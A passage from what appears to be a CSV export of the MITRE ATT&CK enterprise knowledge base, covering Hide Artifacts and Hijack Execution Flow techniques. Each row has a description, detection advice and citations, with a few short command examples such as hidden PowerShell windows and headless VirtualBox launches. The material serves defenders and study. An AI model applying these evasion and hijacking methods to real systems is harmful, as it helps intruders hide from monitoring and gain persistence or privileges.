In macOS, monitor for commands, processes, and file activity in combination with a user that has a userID under 500.(Citation: Cybereason OSX Pirrit) Monitor for modifications to set the <code>Hide500Users</code> key value to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Monitor the command line for usage of the <code>dscl . create</code> command with the <code>IsHidden</code> attribute set to <code>1</code>.(Citation: Apple Support Hide a User Account) ","Linux, Windows, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, User Account: User Account Creation, User Account: User Account Metadata, Windows Registry: Windows Registry Key Modification",True,T1564,,Omkar Gudhate,,,,,,"(Citation: US-CERT TA18-074A),(Citation: FireEye SMOKEDHAM June 2021),(Citation: KISA Operation Muzabi),"
T1564.003,attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0,Hide Artifacts: Hidden Window,"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. 

On Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)

Similarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.

Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)",https://attack.mitre.org/techniques/T1564/003,13 March 2020,15 March 2022,enterprise-attack,1.1,Defense Evasion,"Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.","Linux, Windows, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, Script: Script Execution",True,T1564,,"Travis Smith, Tripwire",User,,,,,"(Citation: Malwarebytes Agent Tesla April 2020),(Citation: Microsoft Actinium February 2022),(Citation: Unit 42 Inception November 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Telefonica Snip3 December 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Medium Metamorfo Apr 2020),(Citation: Morphisec Snip3 May 2021),(Citation: MoustachedBouncer ESET August 2023),(Citation: Alperovitch 2014),(Citation: Cybereason Astaroth Feb 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: Talos Kimsuky Nov 2021),(Citation: Carbon Black HotCroissant April 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: PWC KeyBoys Feb 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: Talos Promethium June 2020),(Citation: PTSecurity Higaisa 2020),(Citation: FireEye APT32 May 2017),(Citation: McAfee Cuba April 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: Check Point Meteor Aug 2021),(Citation: Secureworks MCMD July 2019),(Citation: FireEye APT19),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: objective-see windtail1 dec 2018),(Citation: McAfee APT28 DDE1 Nov 2017),(Citation: Unit 42 DarkHydrus July 2018),(Citation: FireEye Operation Double Tap),(Citation: Bromium Ursnif Mar 2017),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET InvisiMole June 2020),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Unit 42 Gamaredon February 2022),(Citation: FireEye APT29),"
T1564.011,attack-pattern--4a2975db-414e-4c0c-bd92-775987514b4b,Hide Artifacts: Ignore Process Interrupts,"Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.(Citation: Linux Signal Man)  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. 

Adversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue) This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.

Hiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.",https://attack.mitre.org/techniques/T1564/011,24 August 2023,06 November 2023,enterprise-attack,1.0,Defense Evasion,,"Linux, Windows, macOS","Command: Command Execution, Process: Process Creation",True,T1564,,"Viren Chaudhari, Qualys",,,,,,"(Citation: Shlayer jamf gatekeeper bypass 2021),(Citation: CrowdStrike StellarParticle January 2022),"
T1564.004,attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5,Hide Artifacts: NTFS File Attributes,"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)

Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",https://attack.mitre.org/techniques/T1564/004,13 March 2020,29 March 2020,enterprise-attack,1.0,Defense Evasion,"Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)

There are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.

The Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)",Windows,"Command: Command Execution, File: File Metadata, File: File Modification, Process: OS API Execution",True,T1564,"Anti-virus, Host forensic analysis, Signature-based detection","Oddvar Moe, @oddvarmoe; Red Canary",,,NTFS partitioned hard drive,,,"(Citation: Cisco DNSMessenger March 2017),(Citation: Kaspersky Regin),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: LOLBAS Expand),(Citation: ESET Gazer Aug 2017),(Citation: Unit 42 Valak July 2020),(Citation: Ciubotariu 2014),(Citation: LOLBAS Esentutl),(Citation: Mandiant APT41),(Citation: Cybereason Valak May 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET LoJax Sept 2018),(Citation: SentinelOne Valak June 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: Volexity PowerDuke November 2016),(Citation: InsiderThreat NTFS EA Oct 2017)"
T1564.010,attack-pattern--ffe59ad3-ad9b-4b9f-b74f-5beb3c309dc1,Hide Artifacts: Process Argument Spoofing,"Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)

Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)

Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)

This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.",https://attack.mitre.org/techniques/T1564/010,19 November 2021,29 November 2021,enterprise-attack,1.0,Defense Evasion,"Detection of process argument spoofing may be difficult as adversaries may momentarily modify stored arguments used for malicious execution. These changes may bypass process creation detection and/or later process memory analysis. Consider monitoring for [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), which includes monitoring for process creation (especially those in a suspended state) as well as access and/or modifications of these processes (especially by the parent process) via Windows API calls.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)

Analyze process behavior to determine if a process is performing actions it usually does not and/or do no align with its logged command-line arguments.",Windows,Process: Process Creation,True,T1564,,,User,,,,,"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye FiveHands April 2021),"
T1564.009,attack-pattern--b22e5153-ac28-4cc6-865c-2054e36285cb,Hide Artifacts: Resource Forking,"Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)

Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)",https://attack.mitre.org/techniques/T1564/009,12 October 2021,05 May 2022,enterprise-attack,1.0,Defense Evasion,"Identify files with the <code>com.apple.ResourceFork</code> extended attribute and large data amounts stored in resource forks. 

Monitor command-line activity leveraging the use of resource forks, especially those immediately followed by potentially malicious activity such as creating network connections. ",macOS,"Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation",True,T1564,"Gatekeeper, Notarization",Ivan Sinyakov; Jaron Bradley @jbradley89,,,,,,"(Citation: sentinellabs resource named fork 2020),(Citation: OSX Keydnap malware),(Citation: tau bundlore erika noerenberg 2020),(Citation: Apple App Security Overview)"
T1564.006,attack-pattern--b5327dd1-6bf9-4785-a199-25bcbd1f4a9d,Hide Artifacts: Run Virtual Instance,"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)

Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)",https://attack.mitre.org/techniques/T1564/006,29 June 2020,14 October 2021,enterprise-attack,1.1,Defense Evasion,"Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring the size of virtual machines running on the system. Adversaries may create virtual images which are smaller than those of typical virtual machines.(Citation: Shadowbunny VM Defense Evasion) Network adapter information may also be helpful in detecting the use of virtual instances.

Consider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a silent installation may be especially suspect (ex. <code>-silent</code>, <code>-ignore-reboot</code>), as well as those associated with running a headless (in the background with no UI) virtual instance (ex. <code>VBoxManage startvm $VM --type headless</code>).(Citation: Shadowbunny VM Defense Evasion) Similarly, monitoring command line arguments which suppress notifications may highlight potentially malicious activity (ex. <code>VBoxManage.exe setextradata global GUI/SuppressMessages ""all""</code>).

Monitor for commands which enable hypervisors such as Hyper-V.  If virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for [Windows Service](https://attack.mitre.org/techniques/T1543/003), with respect to virtualization software. 

Benign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior.","Linux, Windows, macOS","Command: Command Execution, File: File Creation, Image: Image Metadata, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification",True,T1564,,"Janantha Marasinghe; Johann Rehberger; Menachem Shafran, XM Cyber",User,,,,,"(Citation: ESET LoudMiner June 2019),(Citation: Sophos Maze VM September 2020),(Citation: Sophos Ragnar May 2020),"
T1564.007,attack-pattern--c898c4b5-bf36-4e6e-a4ad-5b8c4c13e35b,Hide Artifacts: VBA Stomping,"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)

MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)

An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)",https://attack.mitre.org/techniques/T1564/007,17 September 2020,15 October 2021,enterprise-attack,1.1,Defense Evasion,"Detection efforts should be placed finding differences between VBA source code and p-code.(Citation: Walmart Roberts Oct 2018) VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler. The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code.(Citation: pcodedmp Bontchev)(Citation: oletools toolkit)

If the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed. However, if the <code>PROJECT</code> stream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed. For example, adding a module name that is undefined to the <code>PROJECT</code> stream will inhibit attempts of reading the VBA source code through the GUI.(Citation: FireEye VBA stomp Feb 2020)","Linux, Windows, macOS","File: File Metadata, Script: Script Execution",True,T1564,,"Rick Cole, Mandiant",User,,MS Office version specified in <code>_VBA_PROJECT</code> stream must match host,,,",(Citation: Microsoft Disable VBA Jan 2020)"
T1574.012,attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335,Hijack Execution Flow: COR_PROFILER,"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",https://attack.mitre.org/techniques/T1574/012,24 June 2020,30 August 2021,enterprise-attack,1.0,"Defense Evasion, Persistence, Privilege Escalation","For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.",Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1574,,"Jesse Brown, Red Canary","Administrator, User",,,,,"(Citation: RedCanary Mockingbird May 2020),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker)"
T1574.001,attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34,Hijack Execution Flow: DLL Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.

There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)

Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)

If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",https://attack.mitre.org/techniques/T1574/001,13 March 2020,30 March 2023,enterprise-attack,1.1,"Defense Evasion, Persistence, Privilege Escalation","Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of `.manifest` and `.local` redirection files that do not correlate with software updates are suspicious.",Windows,"File: File Creation, File: File Modification, Module: Module Load",True,T1574,,"Stefan Kanthak; Travis Smith, Tripwire",,,,,,"(Citation: Cybereason Chaes Nov 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Group IB RTM August 2019),(Citation: FinFisher Citation),(Citation: GitHub PowerSploit May 2012),(Citation: FireEye Hikit Rootkit),(Citation: Proofpoint TA416 Europe March 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: ESET EvilNum July 2020),(Citation: NCC Group WastedLocker June 2020),(Citation: ESET InvisiMole June 2018),(Citation: FireEye FIN7 Oct 2019),(Citation: PowerSploit Documentation),(Citation: PWC Cloud Hopper April 2017),(Citation: MSTIC FoggyWeb September 2021),(Citation: Symantec Whitefly March 2019),(Citation: ZScaler Hacking Team),(Citation: ESET Operation Groundbait),(Citation: Securelist BlackOasis Oct 2017),(Citation: ESET Exchange Mar 2021),(Citation: ESET Crutch December 2020),(Citation: FireEye APT10 April 2017),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Eset Ramsay May 2020),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Github PowerShell Empire),(Citation: ESET Sednit Part 3),(Citation: APT15 Intezer June 2018),(Citation: Mandiant APT1 Appendix),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Microsoft Sxstrace),(Citation: Powersploit),(Citation: Microsoft Dynamic Link Library Search Order),(Citation: Microsoft More information about DLL)"
T1574.002,attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b,Hijack Execution Flow: DLL Side-Loading,"Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).

Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",https://attack.mitre.org/techniques/T1574/002,13 March 2020,30 March 2023,enterprise-attack,2.0,"Defense Evasion, Persistence, Privilege Escalation","Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",Windows,"File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation",True,T1574,"Anti-virus, Application Control",,,,,,,"(Citation: Proofpoint TA459 April 2017),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: FireEye APT10 Sept 2018),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: FinFisher Citation),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: NCC Group Chimera January 2021),(Citation: Forcepoint Monsoon),(Citation: Medium Metamorfo Apr 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Stewart 2014),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: FireEye Clandestine Fox Part 2),(Citation: Proofpoint ZeroT Feb 2017),(Citation: FireEye APT41 Aug 2019),(Citation: Trend Micro Waterbear December 2019),(Citation: FireEye Clandestine Fox),(Citation: Trend Micro Tick November 2019),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Microsoft FinFisher March 2018),(Citation: Proofpoint TA416 November 2020),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Talent-Jump Clambling February 2020),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Microsoft SIR Vol 21),(Citation: Cyble Egregor Oct 2020),(Citation: ESET OceanLotus Mar 2019),(Citation: Securelist LuckyMouse June 2018),(Citation: Unit 42 KerrDown February 2019),(Citation: Arbor Musical Chairs Feb 2018),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: CheckPoint Naikon May 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Red Canary Dridex Threat Report 2021),(Citation: Microsoft Wingbird Nov 2017),(Citation: TrendMicro EarthLusca 2022),(Citation: PTSecurity Higaisa 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: Palo Alto T9000 Feb 2016),(Citation: ATT Sidewinder January 2021),(Citation: Anomali Pirate Panda April 2020),(Citation: Symantec Cicada November 2020),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Recorded Future REDDELTA July 2020),(Citation: Palo Alto PlugX June 2017),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Profero APT27 December 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Deep Instinct Black Basta August 2022),(Citation: Unit42 Emissary Panda May 2019),(Citation: Lunghi Iron Tiger Linux),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Dell TG-3390),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Bitdefender Naikon April 2021),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Palo Alto Networks BBSRAT),(Citation: Dell Sakula),(Citation: Securelist APT10 March 2021),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: FireEye DLL Side-Loading)"
T1574.004,attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490,Hijack Execution Flow: Dylib Hijacking,"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.

Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",https://attack.mitre.org/techniques/T1574/004,16 March 2020,30 March 2023,enterprise-attack,2.0,"Defense Evasion, Persistence, Privilege Escalation","Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. 

Run path dependent libraries can include <code>LC_LOAD_DYLIB</code>, <code>LC_LOAD_WEAK_DYLIB</code>, and <code>LC_RPATH</code>. Other special keywords are recognized by the macOS loader are <code>@rpath</code>, <code>@loader_path</code>, and <code>@executable_path</code>.(Citation: Apple Developer Doco Archive Run-Path) These loader instructions can be examined for individual binaries or frameworks using the <code>otool -l</code> command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Github EmpireProject HijackScanner)",macOS,"File: File Creation, File: File Modification, Module: Module Load",True,T1574,Application Control,,,,,,,"(Citation: Github PowerShell Empire),"
T1574.006,attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825,Hijack Execution Flow: Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD)

